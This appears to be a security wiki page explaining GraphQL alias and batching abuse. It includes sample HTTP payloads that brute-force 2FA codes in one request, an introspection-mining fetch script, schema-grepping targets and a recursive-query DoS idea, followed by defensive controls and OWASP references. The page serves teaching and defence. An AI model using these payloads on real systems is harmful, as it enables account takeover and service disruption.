---
title: GraphQL Batching and Aliasing Abuse
slug: graphql-batching-aliasing-abuse
---

> **TL;DR:** GraphQL aliases let a single request invoke the same resolver many times, neutralising per-request rate limits and amplifying brute-force, enumeration, and resource-exhaustion attacks.

## What it is
GraphQL allows clients to alias fields, so the same query can call a resolver under multiple names in one document. Combined with query batching (an array of operations in one HTTP POST), an attacker can fire dozens or hundreds of logical operations per request. Most rate limiters and WAFs count HTTP requests, not GraphQL operations, so naive throttling, anti-automation, and 2FA verification become trivially bypassable. Introspection further hands the attacker every type, field, and argument needed to weaponise this.

## Preconditions / where it applies
- GraphQL endpoint reachable (`/graphql`, `/api/graphql`, `/v1/graphql`)
- No depth limit, cost analysis, or per-operation rate limit (e.g. `graphql-shield`, `envelop`, Apollo Operation Safelist not deployed)
- Mutation that has security impact per call: login, 2FA verify, password reset, coupon redeem, vote
- Introspection enabled or schema leaked via SDL files, source maps, or Apollo Studio

## Technique
Alias-based amplification of a single brute-force attempt:

```http
POST /graphql HTTP/1.1
Host: target.example
Content-Type: application/json

{"query":"mutation { a1: verify2fa(code:\"000001\"){ok} a2: verify2fa(code:\"000002\"){ok} a3: verify2fa(code:\"000003\"){ok} }"}
```

Scaling to 1000 codes in one HTTP request keeps the WAF counter at 1. Per-operation batching achieves the same with separate documents:

```http
POST /graphql HTTP/1.1
Host: target.example
Content-Type: application/json

[
  {"query":"mutation($c:String!){verify2fa(code:$c){ok}}","variables":{"c":"000001"}},
  {"query":"mutation($c:String!){verify2fa(code:$c){ok}}","variables":{"c":"000002"}}
]
```

Introspection mining to discover hidden mutations:

```javascript
const q = `{ __schema { mutationType { fields { name args { name type { name ofType { name } } } } } } }`;
fetch("https://target.example/graphql", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ query: q }),
}).then(r => r.json()).then(s => console.log(JSON.stringify(s, null, 2)));
```

Useful targets to grep in the schema dump: `internal*`, `admin*`, `impersonate`, `setRole`, `debug*`, fields returning `User` with an `id` argument (often IDOR-prone). Recursive field cycles (`user { friends { friends { friends { ... } } } }`) plus aliases let a single 2 KB query fan out into millions of resolver calls for DoS.

## Detection and defence
- Enforce per-operation rate limits, not per-HTTP-request — count resolver invocations
- Deploy query cost analysis (`graphql-cost-analysis`, Apollo `@cost`) and reject documents above a budget
- Cap alias count, query depth, and selection-set width (`graphql-depth-limit`, `graphql-validation-complexity`)
- Disable introspection in production or gate it behind authentication
- Disable batched requests unless required; if required, treat each operation as a separate request for throttling
- Alert on documents with > 20 aliases for the same field, or batches with > 10 operations

## References
- [GraphQL security cheat sheet (OWASP)](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html) — defensive baseline
- [Apollo operation safelisting docs](https://www.apollographql.com/docs/router/configuration/persisted-queries/) — persisted-query mitigation

See also: [[graphql-attacks]], [[2fa-bypass]], [[idor]].
